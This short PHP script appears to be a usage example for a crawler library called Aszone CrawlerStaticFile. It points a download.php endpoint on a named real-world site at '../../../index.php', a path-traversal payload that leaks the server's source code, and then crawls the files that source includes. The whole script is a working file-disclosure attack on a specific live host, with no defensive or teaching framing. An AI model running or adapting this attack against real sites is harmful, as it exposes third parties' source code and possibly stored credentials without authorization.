<?php
/**
 * Created by PhpStorm.
 * User: lenonleite
 * Date: 01/07/16
 * Time: 18:17
 */

use Aszone\CrawlerStaticFile\CrawlerStaticFil;

require_once __DIR__ . '/vendor/autoload.php';

$command=array();
$file="http://www.bva.com.es/servicios/ce/archivos/download.php?file=../../../index.php";
$crawler = new CrawlerStaticFil($command,$file);

$crawler->getIncludes();
